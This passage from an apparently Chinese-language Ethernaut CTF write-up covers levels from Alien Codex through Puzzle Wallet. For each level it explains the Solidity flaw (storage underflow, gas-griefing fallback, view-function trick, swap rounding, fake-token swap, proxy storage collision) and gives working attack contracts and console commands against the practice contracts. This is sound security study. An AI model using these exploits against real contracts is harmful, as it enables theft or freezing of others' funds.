<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000    60            PUSH1 0x0a</span><br><span class="line">0002    60            PUSH1 0x0c</span><br><span class="line">0004    60            PUSH1 0x00</span><br><span class="line">0006    39            CODECOPY</span><br><span class="line">0007    60            PUSH1 0x0a</span><br><span class="line">0009    60            PUSH1 0x00</span><br><span class="line">000B    F3            RETURN</span><br><span class="line">000C    60            PUSH1 0x2a</span><br><span class="line">000E    60            PUSH1 0x50</span><br><span class="line">0010    52            MSTORE</span><br><span class="line">0011    60            PUSH1 0x20</span><br><span class="line">0013    60            PUSH1 0x50</span><br><span class="line">0015    F3            RETURN</span><br></pre></td></tr></table></figure>

<p>对应的字节码序列为<code>600a600c600039600a6000f3602a60505260206050f3</code></p>
<p>使用we b3.js部署</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bytecode=<span class="string">&#x27;600a600c600039600a6000f3602a60505260206050f3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>:player,<span class="attr">data</span>:bytecode&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">&#x27;0xF2AD1B93CFdCA35a97b69De0c3664033fEbeEE33&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目要求玩家获取到合约的控制权。合约中在开头引入了<code>Ownable</code>合约。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        emit OwnershipTransferred(address(0), _owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0));</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>   在<code>Ownable</code>合约中有一个 address类型的变量  <code>_Owner</code>，只占用20字节，所有变量 <code>contact</code>和其存储在一个插槽中即存放在 slot 0中，而<code>codex.length</code>存储在 slot 1中，由于在合约初始化后动态数据为空，所以slot 1为 0，可以思考利用 <code>record</code>函数向动态数组中写入内容，覆盖掉 slot 0的低位的20字节，将其未覆盖为 player 的地址。</p>
<p><img src="/image/Ethernaut.assets/image-20220711212845554.png" alt="image-20220711212845554"></p>
<ol>
<li><p>由于slot 1的初始值为0，调用<code>retract</code>函数可以让<code>codex.length</code>减1，代码中没有对动态数组的长度进行溢出检查，可以让slot 1 存储的值下溢，slot 1 的值为$2^{256}-1$</p>
<blockquote>
<p>Solidity中动态数组内变量的存储位计算方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b[X] == SLOAD(keccak256(slot) + X)</span><br></pre></td></tr></table></figure></blockquote>
</li>
<li><p>然后计算动态数组第一个元素的存储位置<code>keccack256(1)=0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>，所以$2^256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6$得到的就是slot 0和codex动态数组的首地址偏移。</p>
</li>
<li><p>通过revise函数设置对应的偏移</p>
<p><code>contract.revise(&#39;offset&#39;,&#39;player&#39;) </code></p>
</li>
</ol>
<h3 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner = address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(100);</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题是一个简单的钱包，会随着时间的推移而流失资金。玩家可以成为提款伙伴，慢慢提款。 当玩家在所有者调用withdraw() 时拒绝提取资金，就可以通过这道题目。</p>
<p>即当 owner 进行取款操作时，要阻止 <code>owner.transfer</code>操作，让合约仍有余额，并且交易的 gas 为 1M 或者更少时就可以通过。</p>
<p>这道题的主要漏洞在于<code>pathner.call</code>在调用call函数时没有检查返回值，也没有制定gas，这就<strong>导致如果外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现<code>out of gas</code>的错误</strong>，然后发生<code>revert</code>，自然就无法执行<code>own.transfer</code>操作。</p>
<p><strong>攻击合约：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack &#123;</span><br><span class="line">	address public target;</span><br><span class="line">	constructor(address _addr) public payable &#123;</span><br><span class="line">		target = _addr;</span><br><span class="line">		target.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;,address(this)));</span><br><span class="line">	&#125;</span><br><span class="line">	fallback() external payable &#123;</span><br><span class="line">		assert(false);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题要求以少于 100 的价格完成购买，<code>buy</code>函数内部的逻辑和第11题类似，但是这里的 price 变量用 <code>view</code>修饰，表示不能修改状态，即不能有以下操作：</p>
<ol>
<li>写状态变量</li>
<li>触发事件(emit events)</li>
<li>创建其他合约</li>
<li>使用<code>selfdestruct</code></li>
<li>通过<code>call</code>发送以太币</li>
<li>使用call调用任何没有被标记为<code>view</code>或者<code>pure</code>的函数</li>
<li>使用低级的<code>call</code></li>
<li>使用包含opcode的内联汇编</li>
</ol>
<p>所以不能使用状态变量标记<code>price</code>，但是这里可以利用<code>isSold</code>变量，当第一次调用<code>price</code>函数时， <code>isSold == false</code>，第二次调用时<code>isSold == true</code>，所以这里可以利用该通过<code>if</code>判断，通过部署攻击合约，利用攻击合约调用<code>buy</code>函数，通过<code>if</code>判断然后调用该合约中重写后的<code>price</code>方法，就会得到一个新的<code>price</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">    function buy() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() public view returns (uint256) &#123;</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        IShop(levelInstance).buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22. Dex"></a>22. Dex</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题定义了一个用来交换货币的合约，其中token1和token2都是<code>SwappableToken</code>类型的一种erc20代币，这两个的地址在初始化实例时就确定了。player初始拥有这两种代币的数量为10，而合约拥有数量为100，我们的最终目的是，将合约中某种代币的数量清0，也就是让合约拥有的token1或者token2代币的数量为0。</p>
<p><code>get_swap_price</code>函数内部使用了除法，合约中将返回值定义为<code>uint</code>类型，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币。</p>
<p>首先调用<code>approve</code>函数，方便转账</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">await</span> contract.approve(contract.address,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>

<p>然后通过多次循环转账将拥有的代币全部交换。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Addr_token1 = (<span class="keyword">await</span> contract.token1())</span><br><span class="line">Addr_token2 = (<span class="keyword">await</span> contract.token2())</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//第二次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">20</span>)</span><br><span class="line"><span class="comment">//第三次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">24</span>)</span><br><span class="line"><span class="comment">//第四次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">30</span>)</span><br><span class="line"><span class="comment">//第五次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">41</span>)</span><br><span class="line"><span class="comment">//第六次交换，注意这里是45就正好，多了会超过最大值报错</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">45</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="23-Dex2"><a href="#23-Dex2" class="headerlink" title="23. Dex2"></a>23. Dex2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与<code>Dex</code>相比，<code>Dex2</code>去掉了<code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</code>，交换 token 还与<code>Dex</code>相同，同时，题目要求将合约中的两种 token 消耗完即可通过这道题目。</p>
<p>因此我们的思路是再写一个token，将合约中的 token 全部转移到我们创建的 token 中。</p>
<p>首先部署两个用来转移中间 token 的恶意合约，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Mytoken is ERC20 &#123;</span><br><span class="line">    address public target;</span><br><span class="line">  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在部署时<code>INITIALSUPPLY</code>设置为 200，部署完成后 approve 给题目地址 100 个token，并转给题目地址100个token，所以题目合约和恶意合约在初始状态下各拥有100个恶意合约的token。</p>
<p>然后执行以下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">await</span> contract.approve(contract.address,<span class="number">1000</span>)</span><br><span class="line">token1 = (<span class="keyword">await</span> contract.token1())</span><br><span class="line">token2 = (<span class="keyword">await</span> contract.token2())</span><br><span class="line"></span><br><span class="line"><span class="comment">// mytoken1和mytoken2分别对应2个部署的恶意合约的地址</span></span><br><span class="line">mytoken1 = <span class="string">&#x27;0x02c68949EB02dd68e2B16e9c415cd70A2343409F&#x27;</span></span><br><span class="line">mytoken2 = <span class="string">&#x27;0x14E246478B8Fcb00011bd5239cE2c4573a6acD3e&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(mytoken1,token1,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(mytoken2,token2,<span class="number">100</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24. Puzzle Wallet"></a>24. Puzzle Wallet</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目要求我们成为<code>PuzzleProxy</code>合约的 admin，<code>PuzzleProxy</code>合约继承了<code>UpgradeableProxy</code>，我们可以通过先执行<code>proposeNewAdmin</code>让自己的地址成为<code>pendingAdmin</code>，然后再执行<code>approveNewAdmin</code>来成为admin。但问题在于，<code>approveNewAdmin</code>有<code>onlyAdmin，所以需要对</code>onlyAdmin`进行绕过。</p>
<p>在控制台获取到的地址为<code>PuzzleWallet</code>合约。在该合约中，除了<code>addToWhitelist</code>函数，其他的都要求我们先把自己的地址加入whitelist才能调用，然而<code>addToWhitelist</code>又要求msg.sender必须等于owner，而 owner 又是<code>PuzzleProxy</code>合约的地址。分析到这里，这道题似乎无法下手。但是在题目中提示了<code>delegatecall</code>，首先画一下合约的内存结构图：</p>
<p><strong>PuzzlePorxy：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================================</span><br><span class="line"> unused (12 byte)  | pendingAdmin (20 bytes)         slot 0     </span><br><span class="line">=============================================</span><br><span class="line"> unused (12 bytes) | admin (20 bytes)                slot 1</span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure>

<p><strong>PuzzleWallet:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================================</span><br><span class="line">unused (12 bytes)  |  owner (20 bytes)                slot 0</span><br><span class="line">=============================================</span><br><span class="line">           maxBalance(32 bytes)                       slot 1</span><br><span class="line">=============================================</span><br><span class="line">         whitelisted (32 bytes)                       slot 2</span><br><span class="line">=============================================</span><br><span class="line">						balances (32 bytes)                       slot 3</span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure>

<p>我们如果可以在<code>PuzzleWallet</code>合约中使用<code>delegatecall</code>调用<code>proposeNewAdmin</code>，就可以对 slot 0的内容进行修改，即修改owner，当owner修改为自己后就可以控制<code>PuzzleWallet</code>合约。</p>
<p>利用 etherJs 实例化合约调用<code>proposeNewAdmin</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.js&#x27;</span>);</span><br><span class="line">ethers = _ethers;</span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.Web3Provider(<span class="built_in">window</span>.ethereum);</span><br><span class="line"><span class="keyword">const</span> signer = provider.getSigner();</span><br><span class="line"><span class="comment">//实例化合约</span></span><br><span class="line"><span class="keyword">const</span> contractEthers = <span class="keyword">new</span> ethers.Contract(instance, [<span class="string">&#x27;function proposeNewAdmin(address)&#x27;</span>], signer);</span><br><span class="line"><span class="comment">//调用proposeNewAdmin</span></span><br><span class="line"><span class="keyword">await</span> contractEthers.proposeNewAdmin(player);</span><br><span class="line"><span class="comment">//查看owner</span></span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>解释：为什么可以从PuzzleProxy 合约调用 proposeNewAdmin() 函数</strong></p>
